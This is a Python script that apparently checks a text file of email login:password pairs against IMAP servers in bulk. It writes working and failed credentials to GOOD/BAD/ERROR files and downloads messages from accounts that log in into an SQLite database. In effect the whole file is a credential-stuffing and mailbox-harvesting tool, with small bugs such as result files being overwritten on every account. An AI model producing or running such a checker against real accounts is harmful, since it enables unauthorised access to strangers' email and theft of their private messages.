import emaillib
from emaillib.imap import IMAP

from database.models import Account, Message
from database.database import SQLiteDB

import os
from datetime import datetime

from pony import orm
import threading


def get_accounts(file_path: str = "data\\mails.txt", separator: str = ':') -> list:
    """Parse text file to retrieve logins and passwords and return it"""

    accounts = []

    with open(file_path, 'r') as file:
        lines = file.read().split('\n')

        for line in lines:
            data_list = line.split(separator)
            accounts.append({"login": data_list[0], "password": data_list[1]})

    return accounts


@orm.db_session
def validation(db: SQLiteDB, accounts_list: list, dir_name: str, save_path: str) -> list:

    valid_connections = []
    save_path = os.path.join(save_path, dir_name)

    if not os.path.exists(save_path):
        os.makedirs(save_path)

    for account in accounts_list:

        save_info = f"{account['login']}:{account['password']}\n"

        try:
            imap = IMAP(account['login'], account['password'], secure=True)
            valid_connections.append(imap)
            account['is_valid'] = True

            with open(os.path.join(save_path, "GOOD.txt"), 'w') as good:
                good.write(save_info)

        except emaillib.imap.Error:
            account['is_valid'] = False

            with open(os.path.join(save_path, "BAD.txt"), 'w') as bad:
                bad.write(save_info)

        except Exception:
            with open(os.path.join(save_path, "ERROR.txt"), 'w') as error:
                error.write(save_info)

            continue

        unique_fields = {
            'login': account["login"]
        }

        db.add_in_table(Account, data=account, unique_fields=unique_fields)[1]


@orm.db_session
def add_messages(imap: IMAP, db: SQLiteDB, acc: Account) -> None:
    for message in imap.get_messages(_to=10):
        message["owner"] = acc

        unique_fields = {
            'sender': message["sender"],
            'content': message["content"],
        }

        db.add_in_table(Message, data=message, unique_fields=unique_fields)


@orm.db_session
def fill_tables(db: SQLiteDB, accounts_list: list):
    """Check accounts, retrieve all messages and add it to database"""

    for account in accounts_list:

        print('account: ', accounts_list.index(account))

        try:
            imap = IMAP(account['login'], account['password'], secure=True)
            account['is_valid'] = True
        except emaillib.imap.Error:
            account['is_valid'] = False

        unique_fields = {
            'login': account["login"]
        }

        acc = db.add_in_table(Account, data=account, unique_fields=unique_fields)[1]

        if not account['is_valid']:
            continue

        # thread = threading.Thread(target=add_messages, args=(imap, db, acc))
        # thread.start()

        add_messages(imap, db, acc)


if __name__ == '__main__':
    provider = 'sqlite'
    db_location = os.path.join(os.getcwd(), 'database.sqlite')
    create_db = True
    create_tables = True

    sqlite_db = SQLiteDB(provider, db_location, create_db, create_tables)

    file_path = "data\\mails.txt"
    file_name = file_path.split('\\')[-1]
    save_path = ""

    accounts_list = get_accounts("data\\mails.txt", separator=':')
    # fill_tables(sqlite_db, accounts_list[:1])

    connections_list = validation(sqlite_db, accounts_list[:5], file_name, save_path)

    sqlite_db.show_table(Account, end='\n\n')
    sqlite_db.show_table(Message)
